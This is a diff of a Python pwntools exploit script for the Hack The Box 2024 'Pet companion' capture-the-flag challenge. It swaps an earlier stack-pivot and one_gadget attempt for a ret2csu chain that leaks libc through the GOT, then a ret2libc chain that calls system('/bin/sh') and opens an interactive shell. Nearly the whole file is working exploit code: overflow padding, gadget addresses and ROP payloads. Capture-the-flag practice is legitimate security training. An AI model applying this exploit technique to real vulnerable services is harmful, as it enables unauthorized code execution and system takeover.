@@ -1,4 +1,8 @@
 '''
+__libc_csu_init
+
+https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BEasy%5D%20Pet%20companion
+
 cyclic 1024
 cyclic -l raaa
 68+4 == 72
@@ -15,7 +19,7 @@ context.log_level = 'debug'
 
 offset = 72
 
-binary = ELF('./pet_companion')
+elf = ELF('./pet_companion')
 libc = ELF('./glibc/libc.so.6')
 
 padding = offset*b'A'
@@ -23,78 +27,72 @@ padding = offset*b'A'
 #ip, port='161.35.168.118', 30070
 #ip, port = '83.136.250.41', 46944   #HTB
 #io = remote(ip,port)
-#io = process('./pet_companion')
-io = gdb.debug('./pet_companion','break main')
-
-#0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
-#0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
-
-#ropr void -m 10 #default ropr/ROP_gadget is not enought!!
-#0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
-#0x0040073a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+io = process('./pet_companion')
+#io = gdb.debug('./pet_companion','break main')
 
 
 '''
-one_gadget challenge/glibc/libc.so.6
-0xc961a execve("/bin/sh", r12, r13)
-constraints:
-  [r12] == NULL || r12 == NULL
-  [r13] == NULL || r13 == NULL
-
-0xc961d execve("/bin/sh", r12, rdx)
-constraints:
-  [r12] == NULL || r12 == NULL
-  [rdx] == NULL || rdx == NULL
-
-0xc9620 execve("/bin/sh", rsi, rdx)
-constraints:
-  [rsi] == NULL || rsi == NULL
-  [rdx] == NULL || rdx == NULL
-
-0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
-constraints:
-  rsp & 0xf == 0
-  rcx == NULL
-
-0x4f302 execve("/bin/sh", rsp+0x40, environ)
-constraints:
-  [rsp+0x40] == NULL
-
-0x10a2fc execve("/bin/sh", rsp+0x70, environ)
-constraints:
-  [rsp+0x70] == NULL
-
+   0x0000000000400720 <+64>:	mov    rdx,r15
+   0x0000000000400723 <+67>:	mov    rsi,r14
+   0x0000000000400726 <+70>:	mov    edi,r13d
+   0x0000000000400729 <+73>:	call   QWORD PTR [r12+rbx*8]
+   0x000000000040072d <+77>:	add    rbx,0x1
+   0x0000000000400731 <+81>:	cmp    rbp,rbx
+   0x0000000000400734 <+84>:	jne    0x400720 <__libc_csu_init+64>
+   0x0000000000400736 <+86>:	add    rsp,0x8
+   0x000000000040073a <+90>:	pop    rbx
+   0x000000000040073b <+91>:	pop    rbp
+   0x000000000040073c <+92>:	pop    r12
+   0x000000000040073e <+94>:	pop    r13
+   0x0000000000400740 <+96>:	pop    r14
+   0x0000000000400742 <+98>:	pop    r15
+   0x0000000000400744 <+100>:	ret  
 '''
 
-#one_gadget = 0x4f2a5
-#one_gadget = 0x4f302
-#one_gadget = 0x10a2fc
+'''
+# ret2csu to leak libc address
+r.sendline(flat({
+  0x48: p64(e.sym.__libc_csu_init + 90)    +
+        p64(0) + p64(1) + p64(e.got.write) +
+        p64(1) + p64(e.got.write) + p64(8) +
+        p64(e.sym.__libc_csu_init + 64)    +
+        p64(0) * 7 + p64(e.sym.main)
+}))
+'''
 
-new_stack = (binary.bss() & 0xfff000) + 0xf00
-pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
-pop_rsi_r15 = binary.search(asm('pop rsi ; pop r15 ; ret')).__next__()
-pop_rsp_r13_r14_r15 = binary.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')).__next__()
+#write(1, write.got, 8)
+shellcode = p64(0x000000000040073a) + p64(0) + p64(1) + p64(elf.got.write) + p64(1) + p64(elf.got.write) + p64(8)
+print_write = p64(0x0000000000400720)
+shellcode2 = p64(0)*7 + p64(elf.sym.main)
 
-payload  = b''
-payload += offset * b'A'
-payload += p64(pop_rdi)
-payload += p64(0)
-payload += p64(pop_rsi_r15)
-payload += p64(new_stack)
-payload += p64(0)
-payload += p64(binary.plt.read)
-payload += p64(pop_rsp_r13_r14_r15)
-payload += p64(new_stack)
+payload = padding
+payload += shellcode
+payload += print_write
+payload += shellcode2
 
 io.recvuntil('current status:')
 io.sendline(payload)
 
-payload  = b''
-payload += p64(0)
-payload += p64(0)
-payload += p64(0)
-payload += p64(binary.sym._start)
+#io.recvline_contains('\x7f')
+io.recvline()
+io.recvline()
+io.recvline()
+libc_write = u64(io.recvline().strip())
+#print(hex(libc_write))
 
+libc.address = libc_write - libc.sym.write
+
+'''
+# ret2libc
+rop = ROP(libc, base=libc.address)
+rop.call(rop.ret[0])
+rop.system(next(libc.search(b'/bin/sh\x00')))
+r.sendline(flat({0x48: rop.chain()}))
+'''
+rop_libc = ROP(libc)
+rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
+rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
+payload2 = padding + rop_libc.chain()
 io.recvuntil('current status:')
-io.sendline(payload)
-
+io.sendline(payload2)
+io.interactive()
